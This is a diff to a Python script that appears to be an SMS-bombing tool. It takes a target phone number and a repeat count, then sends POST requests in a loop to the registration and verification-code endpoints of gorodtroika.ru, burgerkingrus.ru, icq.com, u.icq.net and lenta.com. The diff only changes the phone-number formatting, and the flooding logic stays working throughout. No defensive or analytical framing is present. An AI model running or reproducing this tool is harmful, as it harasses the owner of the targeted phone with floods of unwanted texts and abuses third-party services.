@@ -17,9 +17,6 @@ while True:
             break
     print(NUMBER)
 
-    # Number without +
-    WNUMBER = NUMBER[1:12]
-
     while True:
         try:
             RANGE = int(input("Range: "))
@@ -50,28 +47,28 @@ while True:
 
         try:
             response = requests.post('https://gorodtroika.ru/api/registration/phone',
-                                     headers=HEADERS, data={'phone': WNUMBER}, timeout=5.05)
+                                     headers=HEADERS, data={'phone': format_plus(NUMBER)}, timeout=5.05)
             print("[+] gorodtroika.ru")
         except Exception as ex:
             print(f"ERROR: {ex}")
 
         try:
             response = requests.post('https://burgerkingrus.ru/user/v3/auth/signup',
-                                     headers=HEADERS, json={"phone": f"{WNUMBER}", "invite": ""}, timeout=5.05)
+                                     headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}", "invite": ""}, timeout=5.05)
             print("[+] burgerkingrus.ru")
         except Exception as ex:
             print(f"ERROR: {ex}")
 
         try:
             response = requests.post('https://icq.com/smscode/login/ru',
-                                     headers=HEADERS, data={"msisdn": f"{WNUMBER}"}, timeout=5.05)
+                                     headers=HEADERS, data={"msisdn": f"{format_plus(NUMBER)}"}, timeout=5.05)
             print("[+] icq.com")
         except Exception as ex:
             print(f"ERROR: {ex}")
         try:
             response = requests.post('https://u.icq.net/api/v92/rapi/auth/sendCode',
                                      headers=HEADERS, json={"reqId": "81625-1703181748",
-                                                            "params": {"phone": f"{WNUMBER}", "language": "en-US",
+                                                            "params": {"phone": f"{format_plus(NUMBER)}", "language": "en-US",
                                                                        "route": "sms", "devId": "ic1rtwz1s1Hj1O0r",
                                                                        "application": "icq"}}, timeout=5.05)
             print("[+] u.icq.net")
@@ -86,7 +83,7 @@ while True:
             print(f'ERROR: {ex}')
         try:
             response = requests.post('https://lenta.com/api/v1/registration/requestValidationCode',
-                                     headers=HEADERS, json={"phone": f"{WNUMBER}"}, timeout=5.05)
+                                     headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}"}, timeout=5.05)
             print("[+] lenta.com")
         except Exception as ex:
             print(f'ERROR: {ex}')
